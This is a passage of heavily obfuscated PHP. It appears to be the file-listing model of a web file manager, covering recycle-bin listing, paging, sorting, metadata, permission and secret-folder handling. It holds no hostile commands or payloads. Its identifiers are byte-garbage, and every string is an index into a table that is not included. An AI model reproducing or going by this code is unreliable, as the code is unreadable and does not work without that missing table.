¸·’[83]] = array_merge($å‚’ë»ò[$ Î ¸·’[83]], $óÆßÔ«õ); if (isset($å‚’ë»ò[$ Î ¸·’[375]]) && count($¤˜šé¸‚) == $å‚’ë»ò[$ Î ¸·’[375]][$ Î ¸·’[376]]) { return $å‚’ë»ò; } $ø€•Ã­Ó = array(); $¶ÉÏ¦‚ï = array_to_keyvalue($å‚’ë»ò[$ Î ¸·’[82]], $ Î ¸·’[12], $ Î ¸·’[411]); $Æ†ßüŸ­ = array_to_keyvalue($å‚’ë»ò[$ Î ¸·’[83]], $ Î ¸·’[12], $ Î ¸·’[411]); $·‚ªø‘ç = array_merge($Æ†ßüŸ­, $¶ÉÏ¦‚ï); foreach ($¤˜šé¸‚ as $³ñŸëƒ) { if (!in_array($³ñŸëƒ, $·‚ªø‘ç)) { $ø€•Ã­Ó[] = $³ñŸëƒ; } } if ($ø€•Ã­Ó) { Model($ Î ¸·’[437])->removeBySource($ø€•Ã­Ó); } return $å‚’ë»ò; } public function listUserRecycle() { $şˆ»µÉ¯ =& $_SERVER[Ü©»’·]; $„ß»¥«Ô = Model($şˆ»µÉ¯[438])->listData(); if (!$„ß»¥«Ô) { return array(); } $·®—²÷ = array($şˆ»µÉ¯[426] => array($şˆ»µÉ¯[427], $„ß»¥«Ô), $şˆ»µÉ¯[439] => 1); return $this->listSource($·®—²÷); } public function listSource($–‚ÊÙ¤ğ, $ßıš»ú = 3000, $Äë½¸ë = false) { $³‘‰Ã— =& $_SERVER[Ü©»’·]; if (!isset($–‚ÊÙ¤ğ[$³‘‰Ã—[440]])) { $–‚ÊÙ¤ğ[$³‘‰Ã—[440]] = 0; } if (isset($–‚ÊÙ¤ğ[$³‘‰Ã—[441]]) && $–‚ÊÙ¤ğ[$³‘‰Ã—[441]] == $³‘‰Ã—[197]) { $–‚ÊÙ¤ğ[$³‘‰Ã—[421]] = array($³‘‰Ã—[331], $³‘‰Ã—[442]); } $‰ŠµãêÉ = $³‘‰Ã—[443]; $ó§öĞŒ = $this->field($‰ŠµãêÉ)->_makeOrder()->where($–‚ÊÙ¤ğ)->selectPage($ßıš»ú); $this->_listPageCheck($ó§öĞŒ, $‰ŠµãêÉ, $–‚ÊÙ¤ğ); $this->_listDataApply($ó§öĞŒ[$³‘‰Ã—[378]], $Äë½¸ë); $this->_listMake($ó§öĞŒ); return $ó§öĞŒ; } private function _listPageCheck(&$©ä¹“—€, $ç•Ÿ×ôŠ, $ì©ÒŞ) { $¹›Î—º =& $_SERVER[Ü©»’·]; if (!is_array($©ä¹“—€[$¹›Î—º[375]])) { return; } $â—»”Í = $©ä¹“—€[$¹›Î—º[375]]; if ($â—»”Í[$¹›Î—º[377]] <= 1) { return; } if ($â—»”Í[$¹›Î—º[376]] >= 100000) { return; } if (Model($¹›Î—º[444])->get($¹›Î—º[445]) != $¹›Î—º[446]) { return; } $ç•Ÿ×ôŠ = str_replace(array($¹›Î—º[53], $¹›Î—º[342], $¹›Î—º[231]), $¹›Î—º[12], $ç•Ÿ×ôŠ); $ç•Ÿ×ôŠ = $¹›Î—º[447] . str_replace($¹›Î—º[50], $¹›Î—º[448], $ç•Ÿ×ôŠ) . $¹›Î—º[449]; $”½ÚéÀµ = $¹›Î—º[450]; $”½ÚéÀµ = $”½ÚéÀµ . $¹›Î—º[451]; $ô½à˜¼… = $â—»”Í[$¹›Î—º[372]] * ($â—»”Í[$¹›Î—º[353]] - 1) . $¹›Î—º[50] . $â—»”Í[$¹›Î—º[372]]; $»é¸…÷Ü = $this->_makeOrder(!0); $ÚØúÈ™Ö = $¹›Î—º[447] . str_replace($¹›Î—º[50], $¹›Î—º[448], $»é¸…÷Ü[0]); if (strpos($ÚØúÈ™Ö, $¹›Î—º[452])) { $ÚØúÈ™Ö = str_replace($¹›Î—º[452], $¹›Î—º[453], $ÚØúÈ™Ö); } else { $ÚØúÈ™Ö .= $¹›Î—º[454] . $»é¸…÷Ü[1]; } $îöÇéÈ§ = array(); foreach ($ì©ÒŞ as $º‚½çœå => $ÍæÔ´’×) { $îöÇéÈ§[$¹›Î—º[447] . $º‚½çœå] = $ÍæÔ´’×; } $this->alias($¹›Î—º[455])->field($ç•Ÿ×ôŠ)->limit($ô½à˜¼…)->order($ÚØúÈ™Ö); $ş×Áş = $this->join($”½ÚéÀµ)->where($îöÇéÈ§)->select(); if ($ş×Áş) { $©ä¹“—€[$¹›Î—º[378]] = $ş×Áş; } } protected function _makeOrder($ªíÚåõä = false) { $Š‹Çââ =& $_SERVER[Ü©»’·]; $›„·éà = Model($Š‹Çââ[456])->get($Š‹Çââ[457]); $±ıë–¬ù = Model($Š‹Çââ[456])->get($Š‹Çââ[458]); $ïí®İğ = array($Š‹Çââ[459] => $Š‹Çââ[460], $Š‹Çââ[461] => $Š‹Çââ[462]); $Ò‚¶²éÍ = array($Š‹Çââ[32] => $Š‹Çââ[32], $Š‹Çââ[76] => $Š‹Çââ[76], $Š‹Çââ[174] => $Š‹Çââ[421], $Š‹Çââ[463] => $Š‹Çââ[463], $Š‹Çââ[464] => $Š‹Çââ[465], $Š‹Çââ[200] => $Š‹Çââ[200], $Š‹Çââ[85] => $Š‹Çââ[85]); $óìğ›Œ° = Input::get($Š‹Çââ[466], $Š‹Çââ[7], $›„·éà, array_keys($Ò‚¶²éÍ)); $·ü®ã¦¬ = Input::get($Š‹Çââ[467], $Š‹Çââ[7], $±ıë–¬ù, array_keys($ïí®İğ)); if (!in_array($óìğ›Œ°, array_keys($Ò‚¶²éÍ))) { $óìğ›Œ° = $Š‹Çââ[32]; } if (!in_array($·ü®ã¦¬, array_keys($ïí®İğ))) { $óìğ›Œ° = $Š‹Çââ[459]; } if ($óìğ›Œ° == $Š‹Çââ[32]) { } $Í¶åÇò¸ = $Š‹Çââ[468] . $Ò‚¶²éÍ[$óìğ›Œ°] . $Š‹Çââ[53] . $ïí®İğ[$·ü®ã¦¬]; $Í¶åÇò¸ = rtrim(trim($Í¶åÇò¸), $Š‹Çââ[50]); if ($ªíÚåõä) { return array($Í¶åÇò¸, $ïí®İğ[$·ü®ã¦¬]); } return $this->order($Í¶åÇò¸); } protected function _listDataApplyItem($®Î ŒŸÔ, $‚ûƒ¤äº = false) { $Å•Í‰­î = array($®Î ŒŸÔ); $this->_listDataApply($Å•Í‰­î, $‚ûƒ¤äº); return $Å•Í‰­î[0]; } protected function _listDataApply(&$†ÒÍ«¯Ì, $«âÀèÕÑ = false) { $š°Êê¬ì =& $_SERVER[Ü©»’·]; if (!$†ÒÍ«¯Ì) { $†ÒÍ«¯Ì = array(); return; } $ÙÖÑ®´Ò = array_to_keyvalue($†ÒÍ«¯Ì, $š°Êê¬ì[12], $š°Êê¬ì[411]); $ÙÖÑ®´Ò = array_unique($ÙÖÑ®´Ò); $this->_listSourceCache($†ÒÍ«¯Ì); if (!$«âÀèÕÑ) { $this->_listAppendMeta($†ÒÍ«¯Ì, $ÙÖÑ®´Ò); $this->_listAppendFileMeta($†ÒÍ«¯Ì, $ÙÖÑ®´Ò); $this->_listAppendChildren($†ÒÍ«¯Ì, $ÙÖÑ®´Ò); } $this->_listAppendPath($†ÒÍ«¯Ì); $this->_listAppendAuth($†ÒÍ«¯Ì); $this->_listAppendSourceInfo($†ÒÍ«¯Ì, $ÙÖÑ®´Ò); $this->_listAppendUser($†ÒÍ«¯Ì); $this->_listFilterInfo($†ÒÍ«¯Ì, $«âÀèÕÑ); $this->_listAppendAuthSecret($†ÒÍ«¯Ì); } protected function _listSourceCache($ıŞ³úÄş) { $÷òš–è™ =& $_SERVER[Ü©»’·]; foreach ($ıŞ³úÄş as $ªôÇî˜) { self::$cacheSourceInfo[$÷òš–è™[469] . $ªôÇî˜[$÷òš–è™[411]]] = $ªôÇî˜; } } protected function _listFilterInfo(&$¶›­¶¶Û, $¬Îú¶ƒæ = false) { $…îÉ¡îÓ =& $_SERVER[Ü©»’·]; foreach ($¶›­¶¶Û as &$é¼¯éª) { $é¼¯éª = $this->pathInfoFilter($é¼¯éª); self::$cachePathInfo[$…îÉ¡îÓ[470] . intval($¬Îú¶ƒæ) . $…îÉ¡îÓ[395] . $é¼¯éª[$…îÉ¡îÓ[411]]] = $é¼¯éª; } unset($é¼¯éª); } protected function _listMake(&$çŞ­â™) { $ßÂ•‡ÜÅ =& $_SERVER[Ü©»’·]; $çŞ­â™[$ßÂ•‡ÜÅ[82]] = array(); $çŞ­â™[$ßÂ•‡ÜÅ[83]] = array(); foreach ($çŞ­â™[$ßÂ•‡ÜÅ[378]] as $ş£²Ìï²) { $£”¬²ª¾ = $ş£²Ìï²[$ßÂ•‡ÜÅ[419]] == 1 ? $ßÂ•‡ÜÅ[82] : $ßÂ•‡ÜÅ[83]; $çŞ­â™[$£”¬²ª¾][] = $ş£²Ìï²; } unset($çŞ­â™[$ßÂ•‡ÜÅ[378]]); } protected function _listAppendMeta(&$ëõ¿ÀäŸ, $†ÑøÃ­Ì) { $Ë‚¤ç‡÷ =& $_SERVER[Ü©»’·]; $€°İ™Ÿ = array($Ë‚¤ç‡÷[426] => array($Ë‚¤ç‡÷[427], $†ÑøÃ­Ì)); $­ã’ ê­ = Model($Ë‚¤ç‡÷[471])->field($Ë‚¤ç‡÷[472])->where($€°İ™Ÿ)->select(); if (!$­ã’ ê­) { return; } $¡û£í×¨ = array($Ë‚¤ç‡÷[473], $Ë‚¤ç‡÷[474], $Ë‚¤ç‡÷[453]); $»Ÿ–©æ = array(); foreach ($­ã’ ê­ as $êÑ¸ã¥) { if (!isset($»Ÿ–©æ[$êÑ¸ã¥[$Ë‚¤ç‡÷[411]]])) { $»Ÿ–©æ[$êÑ¸ã¥[$Ë‚¤ç‡÷[411]]] = array(); } if (in_array($êÑ¸ã¥[$Ë‚¤ç‡÷[94]], $¡û£í×¨)) { continue; } $»Ÿ–©æ[$êÑ¸ã¥[$Ë‚¤ç‡÷[411]]][$êÑ¸ã¥[$Ë‚¤ç‡÷[94]]] = $êÑ¸ã¥[$Ë‚¤ç‡÷[383]]; } foreach ($ëõ¿ÀäŸ as &$×–˜¾ù¦) { $×–˜¾ù¦[$Ë‚¤ç‡÷[475]] = !1; if (isset($»Ÿ–©æ[$×–˜¾ù¦[$Ë‚¤ç‡÷[411]]])) { $×–˜¾ù¦[$Ë‚¤ç‡÷[475]] = $»Ÿ–©æ[$×–˜¾ù¦[$Ë‚¤ç‡÷[411]]]; } if ($this->fileIsLock($×–˜¾ù¦) && $×–˜¾ù¦[$Ë‚¤ç‡÷[422]]) { $¦¨àéÍ­ = AuthModel::AUTH_EDIT | AuthModel::AUTH_REMOVE; $×–˜¾ù¦[$Ë‚¤ç‡÷[422]][$Ë‚¤ç‡÷[423]] = AuthModel::authDisable($×–˜¾ù¦[$Ë‚¤ç‡÷[422]][$Ë‚¤ç‡÷[423]], $¦¨àéÍ­); $×–˜¾ù¦[$Ë‚¤ç‡÷[422]][$Ë‚¤ç‡÷[476]][$Ë‚¤ç‡÷[422]] = $×–˜¾ù¦[$Ë‚¤ç‡÷[422]][$Ë‚¤ç‡÷[423]]; } } unset($×–˜¾ù¦); } protected function _listAppendFileMeta(&$Úµî™…, $ª­‚´ãû) { $¡‰ºÕÛ¥ =& $_SERVER[Ü©»’·]; $À½ì´‘ğ = array_to_keyvalue($Úµî™…, $¡‰ºÕÛ¥[12], $¡‰ºÕÛ¥[477]); $À½ì´‘ğ = array_filter(array_unique($À½ì´‘ğ)); if (!$À½ì´‘ğ) { return; } $‰Æı‹“ = array($¡‰ºÕÛ¥[478] => array($¡‰ºÕÛ¥[427], $À½ì´‘ğ)); $šĞÍÈ¿¨ = $¡‰ºÕÛ¥[479]; $ºôŒÛç = Model($¡‰ºÕÛ¥[480])->field($šĞÍÈ¿¨)->where($‰Æı‹“)->select(); $ºôŒÛç = array_to_keyvalue($ºôŒÛç, $¡‰ºÕÛ¥[477]); $¨¿’µô° = Model($¡‰ºÕÛ¥[481])->field($¡‰ºÕÛ¥[482])->where($‰Æı‹“)->select(); $¨¿’µô° = $¨¿’µô° ? $¨¿’µô° : array(); $ ş²šãĞ = array(); foreach ($¨¿’µô° as $¶‰¤ğ) { if (!isset($ ş²šãĞ[$¶‰¤ğ[$¡‰ºÕÛ¥[477]]])) { $ ş²šãĞ[$¶‰¤ğ[$¡‰ºÕÛ¥[477]]] = array(); } $ ş²šãĞ[$¶‰¤ğ[$¡‰ºÕÛ¥[477]]][$¶‰¤ğ[$¡‰ºÕÛ¥[94]]] = $¶‰¤ğ[$¡‰ºÕÛ¥[383]]; } foreach ($Úµî™… as &$À‘Èí¿Ÿ) { $‚¼Ñß§¢ = $À‘Èí¿Ÿ[$¡‰ºÕÛ¥[477]]; if (!$‚¼Ñß§¢ || !is_array($ºôŒÛç[$‚¼Ñß§¢])) { continue; } $å†ø”‡ø = $ºôŒÛç[$‚¼Ñß§¢]; $å†ø”‡ø[$¡‰ºÕÛ¥[76]] = $À‘Èí¿Ÿ[$¡‰ºÕÛ¥[76]]; $å†ø”‡ø[$¡‰ºÕÛ¥[32]] = $À‘Èí¿Ÿ[$¡‰ºÕÛ¥[32]]; if (!isset(self::$cacheFileInfo[$¡‰ºÕÛ¥[483] . $‚¼Ñß§¢])) { self::$cacheFileInfo[$¡‰ºÕÛ¥[483] . $‚¼Ñß§¢] = array_merge(array(), $å†ø”‡ø); } unset($ºôŒÛç[$‚¼Ñß§¢][$¡‰ºÕÛ¥[84]]); $îå•ŸÔ = is_array($ ş²šãĞ[$‚¼Ñß§¢]) ? $ ş²šãĞ[$‚¼Ñß§¢] : array(); $À‘Èí¿Ÿ[$¡‰ºÕÛ¥[170]] = array_merge($îå•ŸÔ, $ºôŒÛç[$‚¼Ñß§¢]); if (isset($À‘Èí¿Ÿ[$¡‰ºÕÛ¥[170]][$¡‰ºÕÛ¥[169]])) { $À‘Èí¿Ÿ[$¡‰ºÕÛ¥[169]] = json_decode($À‘Èí¿Ÿ[$¡‰ºÕÛ¥[170]][$¡‰ºÕÛ¥[169]], !0); unset($À‘Èí¿Ÿ[$¡‰ºÕÛ¥[170]][$¡‰ºÕÛ¥[169]]); } } unset($À‘Èí¿Ÿ); } protected function _listAppendSourceInfo(&$”‘üÂç, $ßƒ‘øîÇ) { $…¬Ä¯Ğš =& $_SERVER[Ü©»’·]; if (!defined($…¬Ä¯Ğš[484])) { return; } $Î“¨Í£ = Model($…¬Ä¯Ğš[485])->listData(); $âƒ£Ş… = Model($…¬Ä¯Ğš[434])->listData(); $“¬Ë—ÍØ = Model($…¬Ä¯Ğš[424])->listData(); $÷òëÓô = Model($…¬Ä¯Ğš[486])->listSimple(); $¶”‰Šå = array_to_keyvalue($Î“¨Í£, $…¬Ä¯Ğš[408]); $¾¤ÙáÏ = array_to_keyvalue_group($âƒ£Ş…, $…¬Ä¯Ğš[84], $…¬Ä¯Ğš[435]); $¥âªîÜƒ = array_to_keyvalue($“¬Ë—ÍØ, $…¬Ä¯Ğš[84]); $É¼ñ–„½ = array_to_keyvalue_group($÷òëÓô, $…¬Ä¯Ğš[411]); foreach ($”‘üÂç as &$¨Š±ˆÑ) { $¨Š±ˆÑ[$…¬Ä¯Ğš[86]] = array($…¬Ä¯Ğš[487] => 0, $…¬Ä¯Ğš[488] => 0, $…¬Ä¯Ğš[489] => 0); if (isset($¥âªîÜƒ[$¨Š±ˆÑ[$…¬Ä¯Ğš[411]]])) { $¨Š±ˆÑ[$…¬Ä¯Ğš[86]][$…¬Ä¯Ğš[490]] = 1; $¨Š±ˆÑ[$…¬Ä¯Ğš[86]][$…¬Ä¯Ğš[491]] = $¥âªîÜƒ[$¨Š±ˆÑ[$…¬Ä¯Ğš[411]]][$…¬Ä¯Ğš[32]]; } if ($¾¤ÙáÏ && $¶”‰Šå && isset($¾¤ÙáÏ[$¨Š±ˆÑ[$…¬Ä¯Ğš[411]]])) { $¨Š±ˆÑ[$…¬Ä¯Ğš[86]][$…¬Ä¯Ğš[492]] = array(); foreach ($¾¤ÙáÏ[$¨Š±ˆÑ[$…¬Ä¯Ğš[411]]] as $‹Èßıîè) { $ÎâƒÆğ = $¶”‰Šå[$‹Èßıîè]; $¨Š±ˆÑ[$…¬Ä¯Ğš[86]][$…¬Ä¯Ğš[492]][] = array($…¬Ä¯Ğš[493] => $ÎâƒÆğ[$…¬Ä¯Ğš[408]], $…¬Ä¯Ğš[429] => $ÎâƒÆğ[$…¬Ä¯Ğš[32]], $…¬Ä¯Ğš[494] => $ÎâƒÆğ[$…¬Ä¯Ğš[495]]); } } if ($É¼ñ–„½ && isset($É¼ñ–„½[$¨Š±ˆÑ[$…¬Ä¯Ğš[411]]])) { $¨Š±ˆÑ[$…¬Ä¯Ğš[86]][$…¬Ä¯Ğš[496]] = array(); foreach ($É¼ñ–„½[$¨Š±ˆÑ[$…¬Ä¯Ğš[411]]] as $æë¢¦Ù) { $¨Š±ˆÑ[$…¬Ä¯Ğš[86]][$…¬Ä¯Ğš[496]] = array($…¬Ä¯Ğš[497] => $æë¢¦Ù[$…¬Ä¯Ğš[498]], $…¬Ä¯Ğš[499] => $æë¢¦Ù[$…¬Ä¯Ğš[500]], $…¬Ä¯Ğš[501] => $æë¢¦Ù[$…¬Ä¯Ğš[411]], $…¬Ä¯Ğš[502] => $æë¢¦Ù[$…¬Ä¯Ğš[503]], $…¬Ä¯Ğš[504] => $æë¢¦Ù[$…¬Ä¯Ğš[505]], $…¬Ä¯Ğš[506] => $æë¢¦Ù[$…¬Ä¯Ğš[506]], $…¬Ä¯Ğš[507] => $æë¢¦Ù[$…¬Ä¯Ğš[507]]); } } } unset($¨Š±ˆÑ); return $”‘üÂç; } protected function _listAppendChildren(&$â•›€¿Ø, $„ˆ«¹Ùİ) { $í¶îŸİÎ =& $_SERVER[Ü©»’·]; $ÖõŒ¸ƒ¡ = array(); $ñÉµ£ÊÑ = array($í¶îŸİÎ[207] => 0, $í¶îŸİÎ[208] => 0); foreach ($â•›€¿Ø as &$¦›ŠÃëğ) { if (!$¦›ŠÃëğ[$í¶îŸİÎ[419]]) { continue; } $ÖõŒ¸ƒ¡[] = $¦›ŠÃëğ[$í¶îŸİÎ[411]]; } unset($¦›ŠÃëğ); if (!$ÖõŒ¸ƒ¡) { return; } $İ±ÌéŸ = array($í¶îŸİÎ[441] => array($í¶îŸİÎ[7], $ÖõŒ¸ƒ¡), $í¶îŸİÎ[440] => 0); $ÌÇ”»ÔĞ = array($í¶îŸİÎ[441], $í¶îŸİÎ[419], $í¶îŸİÎ[508] => $í¶îŸİÎ[509]); $û¹ùùÌ¸ = $this->field($ÌÇ”»ÔĞ)->where($İ±ÌéŸ)->group($í¶îŸİÎ[510])->select(); $àøşâ¦ = array(); foreach ($û¹ùùÌ¸ as $ùïâÉË») { $öé†ÏÊâ = $ùïâÉË»[$í¶îŸİÎ[441]]; $®™Š‘îü = $ùïâÉË»[$í¶îŸİÎ[419]] == $í¶îŸİÎ[88] ? $í¶îŸİÎ[208] : $í¶îŸİÎ[207]; if (!isset($àøşâ¦[$öé†ÏÊâ])) { $àøşâ¦[$öé†ÏÊâ] = array($í¶îŸİÎ[207] => 0, $í¶îŸİÎ[208] => 0); } $àøşâ¦[$öé†ÏÊâ][$®™Š‘îü] += $ùïâÉË»[$í¶îŸİÎ[509]]; } foreach ($â•›€¿Ø as &$¦›ŠÃëğ) { if (!$¦›ŠÃëğ[$í¶îŸİÎ[419]]) { continue; } $á¾Ì’ê = is_array($àøşâ¦[$¦›ŠÃëğ[$í¶îŸİÎ[411]]]) ? $àøşâ¦[$¦›ŠÃëğ[$í¶îŸİÎ[411]]] : $ñÉµ£ÊÑ; $¦›ŠÃëğ[$í¶îŸİÎ[208]] = $á¾Ì’ê[$í¶îŸİÎ[208]]; $¦›ŠÃëğ[$í¶îŸİÎ[207]] = $á¾Ì’ê[$í¶îŸİÎ[207]]; unset($¦›ŠÃëğ[$í¶îŸİÎ[421]]); } unset($¦›ŠÃëğ); } protected function _listAppendAuth(&$©ğŸíË) { $Æ’À¿ÙÑ =& $_SERVER[Ü©»’·]; if (!defined($Æ’À¿ÙÑ[484])) { return; } $ŞıÂ’ğÅ = array(); foreach ($©ğŸíË as $‰ìêéú¶) { if ($‰ìêéú¶[$Æ’À¿ÙÑ[420]] == self::TYPE_GROUP) { $ŞıÂ’ğÅ[] = $‰ìêéú¶[$Æ’À¿ÙÑ[411]]; } } if (!$ŞıÂ’ğÅ) { return; } $Œ“Å€ïù = array_to_keyvalue($©ğŸíË, $Æ’À¿ÙÑ[411]); $ˆ£¯Šœ³ = Model($Æ’À¿ÙÑ[511])->getSourceList($ŞıÂ’ğÅ, $Œ“Å€ïù); $µŸÇ‹¢› = $GLOBALS[$Æ’À¿ÙÑ[512]] == 1; foreach ($©ğŸíË as $¿Ë€–È => &$‰ìêéú¶) { $‰ìêéú¶[$Æ’À¿ÙÑ[422]] = $ˆ£¯Šœ³[$‰ìêéú¶[$Æ’À¿ÙÑ[411]]]; if (!$‰ìêéú¶[$Æ’À¿ÙÑ[422]] && $‰ìêéú¶[$Æ’À¿ÙÑ[420]] == self::TYPE_GROUP) { $‰ìêéú¶[$Æ’À¿ÙÑ[422]] = Action($Æ’À¿ÙÑ[513])->pathGroupAuthMake($‰ìêéú¶[$Æ’À¿ÙÑ[514]]); if (!$‰ìêéú¶[$Æ’À¿ÙÑ[422]] && !$µŸÇ‹¢›) { $‰ìêéú¶[$Æ’À¿ÙÑ[202]] = !1; $‰ìêéú¶[$Æ’À¿ÙÑ[201]] = !1; } } if ($‰ìêéú¶[$Æ’À¿ÙÑ[422]]) { $‰ìêéú¶[$Æ’À¿ÙÑ[202]] = AuthModel::authCheckEdit($‰ìêéú¶[$Æ’À¿ÙÑ[422]][$Æ’À¿ÙÑ[423]]); $‰ìêéú¶[$Æ’À¿ÙÑ[201]] = AuthModel::authCheckView($‰ìêéú¶[$Æ’À¿ÙÑ[422]][$Æ’À¿ÙÑ[423]]); } $this->groupPathDisplay($‰ìêéú¶); } unset($‰ìêéú¶); } public function _listAppendAuthSecret(&$¯íä‰Ö) { $¾ŸışÍ‰ =& $_SERVER[Ü©»’·]; if (Model($¾ŸışÍ‰[444])->get($¾ŸışÍ‰[515]) != $¾ŸışÍ‰[88]) { return; } static $˜È×»ò‚ = false; if (!$˜È×»ò‚) { $ÔÄóäÊ = Model($¾ŸışÍ‰[516]); $€œş¹ = Model($¾ŸışÍ‰[517]); $˜È×»ò‚ = $€œş¹->listData(); $˜È×»ò‚ = array_to_keyvalue($˜È×»ò‚, $¾ŸışÍ‰[411]); $ãäŞåÓ = json_decode(Model($¾ŸışÍ‰[444])->get($¾ŸışÍ‰[518]), !0); $ãäŞåÓ = array_to_keyvalue($ãäŞåÓ, $¾ŸışÍ‰[408]); foreach ($˜È×»ò‚ as $ÂÓ­’¨ü => $²àƒóû¹) { $‰â€”ö’ = $ãäŞåÓ[$²àƒóû¹[$¾ŸışÍ‰[519]]]; if (!$‰â€”ö’) { $€œş¹->remove($²àƒóû¹[$¾ŸışÍ‰[408]]); unset($˜È×»ò‚[$ÂÓ­’¨ü]); continue; } $âıˆıÉ = $ÔÄóäÊ->listData($‰â€”ö’[$¾ŸışÍ‰[422]]); if (!$âıˆıÉ) { $€œş¹->remove($²àƒóû¹[$¾ŸışÍ‰[408]]); unset($˜È×»ò‚[$ÂÓ­’¨ü]); continue; } $²àƒóû¹[$¾ŸışÍ‰[422]] = $âıˆıÉ; $²àƒóû¹[$¾ŸışÍ‰[520]] = $‰â€”ö’; $²àƒóû¹[$¾ŸışÍ‰[521]] = Model($¾ŸışÍ‰[522])->getInfoSimpleOuter($²àƒóû¹[$¾ŸışÍ‰[463]]); $˜È×»ò‚[$ÂÓ­’¨ü] = $²àƒóû¹; } } $ÀÌª—ˆá = defined($¾ŸışÍ‰[523]) ? USER_ID : $¾ŸışÍ‰[12]; $Óè—’°€ = array(); $â©¾Ÿ¯Û = $this->_listAppendPath($Óè—’°€, !0); foreach ($¯íä‰Ö as $ÂÓ­’¨ü => &$²àƒóû¹) { if (!is_array($²àƒóû¹[$¾ŸışÍ‰[422]])) { continue; } if ($²àƒóû¹[$¾ŸışÍ‰[420]] != $¾ŸışÍ‰[524]) { continue; } if (isset($˜È×»ò‚[$²àƒóû¹[$¾ŸışÍ‰[411]]])) { $€¢ãó®¬ = $˜È×»ò‚[$²àƒóû¹[$¾ŸışÍ‰[411]]]; if (!is_array($²àƒóû¹[$¾ŸışÍ‰[475]])) { $²àƒóû¹[$¾ŸışÍ‰[475]] = array(); } $²àƒóû¹[$¾ŸışÍ‰[475]][$¾ŸışÍ‰[525]] = $€¢ãó®¬[$¾ŸışÍ‰[519]]; $²àƒóû¹[$¾ŸışÍ‰[422]][$¾ŸışÍ‰[526]] = $€¢ãó®¬; $²àƒóû¹[$¾ŸışÍ‰[422]][$¾ŸışÍ‰[527]] = $²àƒóû¹[$¾ŸışÍ‰[528]]; $²àƒóû¹[$¾ŸışÍ‰[422]][$¾ŸışÍ‰[529]] = $¾ŸışÍ‰[88]; if ($€¢ãó®¬[$¾ŸışÍ‰[463]] != $ÀÌª—ˆá) { $²àƒóû¹[$¾ŸışÍ‰[422]][$¾ŸışÍ‰[423]] = $²àƒóû¹[$¾ŸışÍ‰[422]][$¾ŸışÍ‰[423]] & $€¢ãó®¬[$¾ŸışÍ‰[422]][$¾ŸışÍ‰[422]]; } continue; } $¸´›ëÀı = $this->parentLevelArray($²àƒóû¹[$¾ŸışÍ‰[530]]); $¬Í‰Ô€ø = array_reverse($¸´›ëÀı); foreach ($¬Í‰Ô€ø as $ÙŞÅÌ’² => $…Õ×÷) { if (!isset($˜È×»ò‚[$…Õ×÷])) { continue; } $€¢ãó®¬ = $˜È×»ò‚[$…Õ×÷]; $²àƒóû¹[$¾ŸışÍ‰[422]][$¾ŸışÍ‰[526]] = $€¢ãó®¬; if ($€¢ãó®¬[$¾ŸışÍ‰[463]] != $ÀÌª—ˆá) { $²àƒóû¹[$¾ŸışÍ‰[422]][$¾ŸışÍ‰[423]] = $²àƒóû¹[$¾ŸışÍ‰[422]][$¾ŸışÍ‰[423]] & $€¢ãó®¬[$¾ŸışÍ‰[422]][$¾ŸışÍ‰[422]]; } $îåÌåº˜ = $¾ŸışÍ‰[12]; $¸ ¾ÁëÆ = count($¸´›ëÀı) - $ÙŞÅÌ’²; for ($¼Éá°à = 0; $¼Éá°à < $¸ ¾ÁëÆ; $¼Éá°à++) { if (!isset($â©¾Ÿ¯Û[$¸´›ëÀı[$¼Éá°à]])) { $îåÌåº˜ = $¾ŸışÍ‰[12]; break; } $îåÌåº˜ = $îåÌåº˜ . rtrim($â©¾Ÿ¯Û[$¸´›ëÀı[$¼Éá°à]], $¾ŸışÍ‰[8]) . $¾ŸışÍ‰[8]; } $²àƒóû¹[$¾ŸışÍ‰[422]][$¾ŸışÍ‰[527]] = rtrim($îåÌåº˜, $¾ŸışÍ‰[8]) . $¾ŸışÍ‰[8]; break; } } unset($²àƒóû¹); } public function groupPathDisplay(&$Ô‰ìŞ—ç) { $œÃ¼ºÄç =& $_SERVER[Ü©»’·]; if ($Ô‰ìŞ—ç[$œÃ¼ºÄç[420]] != self::TYPE_GROUP) { return; } $¦‰ªûçÃ = Model($œÃ¼ºÄç[531])->getInfo($Ô‰ìŞ—ç[$œÃ¼ºÄç[514]]); $›¹š„…ä = $this->parentLevelArray($¦‰ªûçÃ[$œÃ¼ºÄç[530]]); $ ÑÒ½¯Ä = $œÃ¼ºÄç[12]; foreach ($›¹š„…ä as $èº“£ıú) { $•¤Ä¯ÀÕ = Model($œÃ¼ºÄç[531])->getInfo($èº“£ıú); $ ÑÒ½¯Ä .= $•¤Ä¯ÀÕ[$œÃ¼ºÄç[86]][$œÃ¼ºÄç[411]] . $œÃ¼ºÄç[50]; } $Ô‰ìŞ—ç[$œÃ¼ºÄç[532]] = $¦‰ªûçÃ[$œÃ¼ºÄç[441]]; $Ô‰ìŞ—ç[$œÃ¼ºÄç[533]] = $¦‰ªûçÃ[$œÃ¼ºÄç[530]]; $Ô‰ìŞ—ç[$œÃ¼ºÄç[534]] = $¦‰ªûçÃ[$œÃ¼ºÄç[535]]; $Ô‰ìŞ—ç[$œÃ¼ºÄç[536]] = $ ÑÒ½¯Ä . $¦‰ªûçÃ[$œÃ¼ºÄç[86]][$œÃ¼ºÄç[411]]; } protected function _listAppendPath(&$„ÁßìÀ, $Âà¤®¸ = false) { $èæ¯ ŠÓ =& $_SERVER[Ü©»’·]; static $Ÿ§¿ØíÙ = array(); $ƒé³¸´° = array(); $Äû•Ÿ˜¾ = array(); if ($Âà¤®¸) { return $Ÿ§¿ØíÙ; } foreach ($„ÁßìÀ as &$áÊ¥ÔŠ) { $ã¶Òæç¿ = $áÊ¥ÔŠ[$èæ¯ ŠÓ[411]]; if ($áÊ¥ÔŠ[$èæ¯ ŠÓ[419]] == $èæ¯ ŠÓ[88] && $áÊ¥ÔŠ[$èæ¯ ŠÓ[441]] != 0) { $Ÿ§¿ØíÙ[$ã¶Òæç¿] = $áÊ¥ÔŠ[$èæ¯ ŠÓ[32]]; } if ($áÊ¥ÔŠ[$èæ¯ ŠÓ[419]] == $èæ¯ ŠÓ[88] && $áÊ¥ÔŠ[$èæ¯ ŠÓ[441]] == 0 && !isset($Ÿ§¿ØíÙ[$ã¶Òæç¿])) { $Ÿ§¿ØíÙ[$ã¶Òæç¿] = $this->_listAppendPathRoot($áÊ¥ÔŠ, array()); } if (isset($Äû•Ÿ˜¾[$áÊ¥ÔŠ[$èæ¯ ŠÓ[530]]])) { continue; } $Äû•Ÿ˜¾[$áÊ¥ÔŠ[$èæ¯ ŠÓ[530]]] = !0; $ÂÀ‰”º = $this->parentLevelArray($áÊ¥ÔŠ[$èæ¯ 